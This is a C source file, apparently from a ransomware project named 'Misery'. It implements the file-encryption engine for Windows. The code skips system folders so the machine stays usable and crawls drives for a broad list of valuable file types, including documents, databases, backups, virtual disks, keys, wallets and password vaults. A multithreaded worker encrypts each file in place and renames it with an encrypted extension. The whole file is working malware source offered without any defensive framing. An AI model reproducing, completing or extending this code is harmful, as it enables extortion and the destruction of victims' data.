#include "fileops.h"
#include "crypto.h"
#include "misery_config.h"
#include <stdio.h>
#include <string.h>
#include <shlobj.h>
#include <inttypes.h>

static bool IsTargetExtension(const char *path);

/* ── Stuff we skip (system dirs) ── */
static const char *g_skip[] = {
    "\\Windows", "\\System32", "\\SysWOW64",
    "\\Program Files", "\\Program Files (x86)",
    "\\AppData", "\\$Recycle.Bin", "\\Boot",
    "\\ProgramData\\Microsoft",
    "\\.venv",
    "\\node_modules",
    NULL
};

/* ── Extensions we encrypt ── */
static const char *g_ext[] = {
    ".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pps",".ppsx",
    ".pdf",".txt",".rtf",".csv",".tsv",
    ".jpg",".jpeg",".png",".gif",".bmp",".tif",".tiff",".raw",
    ".mp3",".mp4",".avi",".mkv",".wmv",".mov",".flv",".m4v",
    ".zip",".rar",".7z",".tar",".gz",".bz2",".xz",".zst",".iso", ".js",
    ".sql",".mdb",".accdb",".sqlite",".db",".mdf",".ldf",
    ".pst",".ost",".eml",".msg",".mbox",
    ".key",".pem",".cer",".crt",".pfx",".p12",
    ".vmx",".vmdk",".vhd",".vhdx",".vdi",".vbox",".ova",".ovf",
    ".bak",".old",".backup",".bkp",".dmp",".dump",
    ".cfg",".config",".conf",".ini",".inf",
    ".py",".java",".c",".cpp",".h",".hpp",".cs",".js",".ts",".vue",
    ".php",".asp",".aspx",".jsp",".rb",".go",".rs",".swift",".kt",
    ".html",".htm",".css",".xml",".json",".yaml",".yml",".md",
    ".psd",".ai",".svg",".dxf",".dwg",".cdr",
    ".wav",".flac",".aac",".ogg",".wma",
    ".vcf",".ics",".dbx",".wallet",".dat",
    ".log",".sav",".rdp",".vnc",
    ".gpg",".asc",".kdbx",".kdb",
    ".env",".gitconfig",".gitignore",
    ".ovpn",
    NULL
};

/* ==================================================================
 * INTERNAL CONTEXT
 * ================================================================== */
struct FILEOPS_CTX {
    FILEOPS_CONFIG    config;
    FILEOPS_STATS     stats;
    bool              statsInitialized;

    CRITICAL_SECTION  statsLock;

    /* Thread pool */
    HANDLE           *threads;
    DWORD             threadCount;

    /* Work queue */
    struct WorkItem {
        struct WorkItem *next;
        WCHAR   path[];              /* flexible array */
    }                *queueHead;
    struct WorkItem **queueTail;
    LONG              queueCount;

    LONG              activeWorkers;

    CRITICAL_SECTION  queueLock;
    CONDITION_VARIABLE queueNotEmpty;
    CONDITION_VARIABLE queueIdle;

    volatile LONG     shutdownFlag;
};

/* ── Thread pool worker ── */
static DWORD WINAPI WorkerThread(LPVOID lpParam) {
    FILEOPS_CTX *ctx = (FILEOPS_CTX *)lpParam;

    for (;;) {
        struct WorkItem *item = NULL;

        EnterCriticalSection(&ctx->queueLock);

        /* Wait while queue is empty and not shutting down */
        while (ctx->queueHead == NULL && !ctx->shutdownFlag) {
            SleepConditionVariableCS(&ctx->queueNotEmpty,
                                     &ctx->queueLock, INFINITE);
        }

        /* If shutting down and nothing left, exit */
        if (ctx->shutdownFlag && ctx->queueHead == NULL) {
            LeaveCriticalSection(&ctx->queueLock);
            break;
        }

        /* Dequeue head */
        item = ctx->queueHead;
        ctx->queueHead = item->next;
        if (ctx->queueHead == NULL) {
            ctx->queueTail = &ctx->queueHead;
        }
        ctx->queueCount--;
        ctx->activeWorkers++;
        LeaveCriticalSection(&ctx->queueLock);

        /* ── Process the file ── */
        char narrowPath[FILEOPS_MAX_PATH];
        int narrowLen = WideCharToMultiByte(CP_UTF8, 0,
                                            item->path, -1,
                                            narrowPath, sizeof(narrowPath),
                                            NULL, NULL);
        HeapFree(GetProcessHeap(), 0, item);
        item = NULL;

        if (narrowLen <= 0 || narrowLen >= (int)sizeof(narrowPath)) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: Path conversion failed (err: %lu)",
                      GetLastError());
            EnterCriticalSection(&ctx->statsLock);
            ctx->stats.filesFailed++;
            LeaveCriticalSection(&ctx->statsLock);

            EnterCriticalSection(&ctx->queueLock);
            ctx->activeWorkers--;
            WakeConditionVariable(&ctx->queueIdle);
            LeaveCriticalSection(&ctx->queueLock);
            continue;
        }

        /* ── Encrypt file logic ── */
        HANDLE hFile = INVALID_HANDLE_VALUE;
        BYTE  *buf   = NULL;
        BYTE  *plaintext = NULL;
        DWORD  bufSize = 0;
        DWORD  fs = 0;
        bool   success = false;

        hFile = CreateFileA(narrowPath, GENERIC_READ,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL, OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot open %s (err: %lu)",
                      narrowPath, GetLastError());
            goto worker_done_file;
        }

        fs = GetFileSize(hFile, NULL);
        if (fs == INVALID_FILE_SIZE) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: GetFileSize failed for %s (err: %lu)",
                      narrowPath, GetLastError());
            CloseHandle(hFile);
            hFile = INVALID_HANDLE_VALUE;
            goto worker_done_file;
        }

        if (fs == 0) {
            /* Empty file — nothing to encrypt, count as success */
            CloseHandle(hFile);
            hFile = INVALID_HANDLE_VALUE;
            MiseryLog(MISERY_LOG_INFO, "FileOps: Skipped empty file: %s", narrowPath);
            success = true;
            EnterCriticalSection(&ctx->statsLock);
            ctx->stats.filesSucceeded++;
            LeaveCriticalSection(&ctx->statsLock);
            goto worker_done_file;
        }

        bufSize = CRYPTO_REQUIRED_CAPACITY(fs);
        buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_READWRITE);
        if (!buf) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) failed for %s (err: %lu)",
                      bufSize, narrowPath, GetLastError());
            goto worker_done_file;
        }

        plaintext = (BYTE *)VirtualAlloc(NULL, fs,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_READWRITE);
        if (!plaintext) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) for plaintext failed for %s (err: %lu)",
                      fs, narrowPath, GetLastError());
            goto worker_done_file;
        }

        DWORD rd = 0;
        if (!ReadFile(hFile, plaintext, fs, &rd, NULL) || rd != fs) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: ReadFile failed for %s (err: %lu)",
                      narrowPath, GetLastError());
            goto worker_done_file;
        }

        CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;

        DWORD encLen = 0;
        CRYPTO_ERROR cerr = EncryptBuffer(ctx->config.crypto_ctx,
                                          plaintext,
                                          rd,
                                          buf,
                                          &encLen,
                                          bufSize);

        SecureZeroMemory(plaintext, fs);
        VirtualFree(plaintext, 0, MEM_RELEASE);
        plaintext = NULL;

        if (cerr != CRYPTO_SUCCESS) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: EncryptBuffer failed for %s: %s (code=%d)",
                      narrowPath, GetErrorString(cerr), cerr);
            goto worker_done_file;
        }

        /* ── Build temp path ── */
        char tmpPath[FILEOPS_MAX_PATH];
        int tmpLen = snprintf(tmpPath, sizeof(tmpPath), "%s.tmp", narrowPath);
        if (tmpLen < 0 || tmpLen >= (int)sizeof(tmpPath)) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: Temp path too long for %s", narrowPath);
            goto worker_done_file;
        }

        HANDLE hWrite = CreateFileA(tmpPath, GENERIC_WRITE,
                                    FILE_SHARE_READ,
                                    NULL, CREATE_ALWAYS,
                                    FILE_ATTRIBUTE_NORMAL, NULL);
        if (hWrite == INVALID_HANDLE_VALUE) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot create tmp %s (err: %lu)",
                      tmpPath, GetLastError());
            goto worker_done_file;
        }

        DWORD wr = 0;
        BOOL writeOk = WriteFile(hWrite, buf, encLen, &wr, NULL);
        CloseHandle(hWrite);

        if (!writeOk || wr != encLen) {
            MiseryLog(MISERY_LOG_WARN,
                      "FileOps: WriteFile failed for %s (wrote %lu/%lu, err: %lu)",
                      tmpPath, wr, encLen, GetLastError());
            DeleteFileA(tmpPath);
            goto worker_done_file;
        }

        /* ── Atomic rename: .tmp → original ── */
        if (!MoveFileExA(tmpPath, narrowPath,
                         MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: MoveFileEx %s → %s failed (err: %lu)",
                      tmpPath, narrowPath, GetLastError());
            DeleteFileA(tmpPath);
            goto worker_done_file;
        }

        /* ── Rename original → original.encrypted ── */
        char encPath[FILEOPS_MAX_PATH];
        int encLen2 = snprintf(encPath, sizeof(encPath), "%s%s",
                               narrowPath, ENC_EXT);
        if (encLen2 < 0 || encLen2 >= (int)sizeof(encPath)) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: Encrypted path too long for %s", narrowPath);
            goto worker_done_file;
        }

        if (!MoveFileExA(narrowPath, encPath,
                         MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
            MiseryLog(MISERY_LOG_WARN, "FileOps: MoveFileEx %s → %s failed (err: %lu)",
                      narrowPath, encPath, GetLastError());
            goto worker_done_file;
        }

        /* ── Full success ── */
        success = true;
        MiseryLog(MISERY_LOG_INFO, "FileOps: Encrypted %s (%lu bytes) → %s",
                  narrowPath, fs, encPath);
        EnterCriticalSection(&ctx->statsLock);
        ctx->stats.bytesProcessed += fs;
        ctx->stats.filesSucceeded++;
        LeaveCriticalSection(&ctx->statsLock);

    worker_done_file:
        if (!success) {
            EnterCriticalSection(&ctx->statsLock);
            ctx->stats.filesFailed++;
            ctx->stats.lastSystemError = GetLastError();
            LeaveCriticalSection(&ctx->statsLock);
        }

        if (buf) {
            SecureZeroMemory(buf, bufSize);
            VirtualFree(buf, 0, MEM_RELEASE);
            buf = NULL;
        }
        if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);

        /* ── Decrement active workers and signal idle (INSIDE LOCK) ── */
        EnterCriticalSection(&ctx->queueLock);
        ctx->activeWorkers--;
        WakeConditionVariable(&ctx->queueIdle);
        LeaveCriticalSection(&ctx->queueLock);
    }

    return 0;
}

/* ── Enqueue a single file ── */
static void EnqueueFile(FILEOPS_CTX *ctx, const WCHAR *fullPath) {
    if (!ctx || !fullPath) return;

    size_t pathBytes = (wcslen(fullPath) + 1) * sizeof(WCHAR);

    struct WorkItem *item = (struct WorkItem *)
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                  sizeof(struct WorkItem) + pathBytes);
    if (!item) {
        MiseryLog(MISERY_LOG_WARN, "FileOps: HeapAlloc failed for enqueue (size=%zu)",
                  sizeof(struct WorkItem) + pathBytes);
        return;
    }

    memcpy(item->path, fullPath, pathBytes);
    item->next = NULL;

    EnterCriticalSection(&ctx->queueLock);
    *ctx->queueTail = item;
    ctx->queueTail = &item->next;
    ctx->queueCount++;
    WakeConditionVariable(&ctx->queueNotEmpty);
    LeaveCriticalSection(&ctx->queueLock);
}

/* ── Internal recursive crawler (WCHAR) ── */
static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
    if (depth > MAX_DEPTH) return;

    if (ctx->config.pfnShouldSkip && ctx->config.pfnShouldSkip(dir))
        return;

    WCHAR pattern[FILEOPS_MAX_PATH];
    _snwprintf(pattern, FILEOPS_MAX_PATH - 1, L"%s\\*", dir);

    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileExW(pattern, FindExInfoStandard,
                                     &fd, FindExSearchNameMatch,
                                     NULL, 0);
    if (hFind == INVALID_HANDLE_VALUE) {
        char narrowDir[FILEOPS_MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, dir, -1, narrowDir, sizeof(narrowDir), NULL, NULL);
        MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot open directory: %s (err: %lu)",
                  narrowDir, GetLastError());
        return;
    }

    do {
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L".."))
            continue;

        WCHAR full[FILEOPS_MAX_PATH];
        int written = _snwprintf(full, FILEOPS_MAX_PATH - 1,
                                 L"%s\\%s", dir, fd.cFileName);
        if (written < 0 || written >= (int)(FILEOPS_MAX_PATH - 1))
            continue;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            TraverseInternal(ctx, full, depth + 1);
        } else {
            char narrow[FILEOPS_MAX_PATH];
            if (WideCharToMultiByte(CP_UTF8, 0, full, -1,
                                    narrow, sizeof(narrow),
                                    NULL, NULL) <= 0)
                continue;

            if (!IsTargetExtension(narrow)) continue;

            char encPath[FILEOPS_MAX_PATH];
            int encLen = snprintf(encPath, sizeof(encPath), "%s%s",
                                  narrow, ENC_EXT);
            if (encLen < 0 || encLen >= (int)sizeof(encPath))
                continue;

            if (GetFileAttributesA(encPath) != INVALID_FILE_ATTRIBUTES)
                continue;

            MiseryLog(MISERY_LOG_INFO, "FileOps: Queueing file: %s", narrow);
            EnqueueFile(ctx, full);
        }
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
}

/* ==================================================================
 * PUBLIC API
 * ================================================================== */

FILEOPS_CTX* FileOps_CreateContext(const FILEOPS_CONFIG* config) {
    FILEOPS_CTX *ctx = (FILEOPS_CTX *)
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FILEOPS_CTX));
    if (!ctx) return NULL;

    if (config) {
        ctx->config = *config;
    } else {
        ctx->config.threadCount = FILEOPS_DEFAULT_THREADS;
        ctx->config.ioBufferSize = FILEOPS_IO_CHUNK;
        ctx->config.flags = FILEOPS_FLAG_RECURSIVE;
        ctx->config.extension[0] = L'\0';
        ctx->config.pfnShouldSkip = NULL;
        ctx->config.crypto_ctx = NULL;
    }

    if (!ctx->config.crypto_ctx) {
        MiseryLog(MISERY_LOG_ERROR, "FileOps: crypto_ctx is NULL!");
        HeapFree(GetProcessHeap(), 0, ctx);
        return NULL;
    }

    if (ctx->config.threadCount < 1)
        ctx->config.threadCount = 1;
    if (ctx->config.threadCount > 128)
        ctx->config.threadCount = 128;

    ctx->queueTail = &ctx->queueHead;
    ctx->threadCount = ctx->config.threadCount;

    InitializeCriticalSection(&ctx->statsLock);
    ctx->statsInitialized = true;

    InitializeCriticalSection(&ctx->queueLock);
    InitializeConditionVariable(&ctx->queueNotEmpty);
    InitializeConditionVariable(&ctx->queueIdle);

    /* Spawn worker threads */
    ctx->threads = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                              sizeof(HANDLE) * ctx->threadCount);
    if (!ctx->threads) {
        DeleteCriticalSection(&ctx->statsLock);
        DeleteCriticalSection(&ctx->queueLock);
        HeapFree(GetProcessHeap(), 0, ctx);
        return NULL;
    }

    DWORD threadsCreated = 0;
    for (DWORD i = 0; i < ctx->threadCount; i++) {
        HANDLE h = CreateThread(NULL, 0, WorkerThread, ctx, 0, NULL);
        if (h) {
            ctx->threads[i] = h;
            threadsCreated++;
        } else {
            ctx->threads[i] = NULL;
        }
    }

    if (threadsCreated == 0) {
        MiseryLog(MISERY_LOG_ERROR, "FileOps: Failed to create worker threads");
        DeleteCriticalSection(&ctx->statsLock);
        DeleteCriticalSection(&ctx->queueLock);
        HeapFree(GetProcessHeap(), 0, ctx->threads);
        HeapFree(GetProcessHeap(), 0, ctx);
        return NULL;
    }

    MiseryLog(MISERY_LOG_INFO, "FileOps: Created context with %lu threads", threadsCreated);
    return ctx;
}

void FileOps_TraverseAndQueue(FILEOPS_CTX* ctx, const WCHAR* rootPath) {
    if (!ctx || !rootPath) return;
    char narrowPath[FILEOPS_MAX_PATH];
    WideCharToMultiByte(CP_UTF8, 0, rootPath, -1, narrowPath, sizeof(narrowPath), NULL, NULL);
    MiseryLog(MISERY_LOG_INFO, "FileOps: Starting traverse of: %s", narrowPath);
    TraverseInternal(ctx, rootPath, 0);
}


void FileOps_WaitForCompletion(FILEOPS_CTX* ctx) {
    if (!ctx) return;

    EnterCriticalSection(&ctx->queueLock);
    while (ctx->queueCount > 0 || ctx->activeWorkers > 0) {
        SleepConditionVariableCS(&ctx->queueIdle,
                                 &ctx->queueLock, INFINITE);
    }
    LeaveCriticalSection(&ctx->queueLock);
}

void FileOps_GetStats(FILEOPS_CTX* ctx, FILEOPS_STATS* outStats) {
    if (!ctx || !outStats) return;

    EnterCriticalSection(&ctx->statsLock);
    *outStats = ctx->stats;
    LeaveCriticalSection(&ctx->statsLock);
}

void FileOps_DestroyContext(FILEOPS_CTX* ctx) {
    if (!ctx) return;

    EnterCriticalSection(&ctx->queueLock);
    InterlockedExchange(&ctx->shutdownFlag, 1);
    WakeAllConditionVariable(&ctx->queueNotEmpty);
    LeaveCriticalSection(&ctx->queueLock);

    for (DWORD i = 0; i < ctx->threadCount; i++) {
        if (ctx->threads[i]) {
            WaitForSingleObject(ctx->threads[i], INFINITE);
            CloseHandle(ctx->threads[i]);
        }
    }

    struct WorkItem *item = ctx->queueHead;
    while (item) {
        struct WorkItem *next = item->next;
        HeapFree(GetProcessHeap(), 0, item);
        item = next;
    }

    HeapFree(GetProcessHeap(), 0, ctx->threads);
    DeleteCriticalSection(&ctx->statsLock);
    DeleteCriticalSection(&ctx->queueLock);
    HeapFree(GetProcessHeap(), 0, ctx);
}

/* ── Should skip system directories ── */
bool FileOps_DefaultShouldSkip(const WCHAR* path) {
    char narrow[FILEOPS_MAX_PATH];
    if (!WideCharToMultiByte(CP_UTF8, 0, path, -1,
                              narrow, sizeof(narrow), NULL, NULL))
        return false;

    for (int i = 0; g_skip[i]; i++) {
        char *found = strstr(narrow, g_skip[i]);
        if (found) return true;
    }
    return false;
}

/* ── Is target extension? ── */
static bool IsTargetExtension(const char* path) {
    if (!path) return false;
    const char *dot = strrchr(path, '.');
    if (!dot) return false;

    for (int i = 0; g_ext[i]; i++) {
        if (_stricmp(dot, g_ext[i]) == 0)
            return true;
    }
    return false;
}
